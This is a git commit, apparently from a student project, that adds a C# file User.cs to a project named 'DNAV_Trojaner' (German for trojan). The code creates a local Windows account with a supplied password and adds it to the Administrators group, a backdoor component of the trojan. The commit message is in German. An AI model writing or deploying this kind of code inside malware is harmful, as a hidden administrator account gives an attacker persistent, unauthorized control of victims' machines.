cf7fcff72f5964f8f0af53db1db021539547efcb
Kueppers, Niclas <niclas.kueppers@hsrw.org>
2020-01-04 17:54:29 +0100

    User.cs hinzugefügt Beinhaltet eine Methode um lokales Adminkonto hinzuzufügen. Benutzername sowie Passwort werden als Übergabeparameter entgegengenommen.

---
+++ DNAV_Trojaner/User.cs
@@ -0,0 +1,20 @@
+﻿using System;
+using System.DirectoryServices;
+
+namespace DNAV_Trojaner
+{
+    class User
+    {
+        public static void Create(string username, string password)
+        {
+            DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
+            DirectoryEntry NewUser = AD.Children.Add(username, "user");
+            NewUser.Invoke("SetPassword", new object[] { password });
+            NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
+            NewUser.CommitChanges(); // -> Hängt sich hier auf, wenn es den Benutzer schon gibt.
+            DirectoryEntry grp;
+            grp = AD.Children.Find("Administratoren", "group"); 
+            if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
+        }
+    }
+}
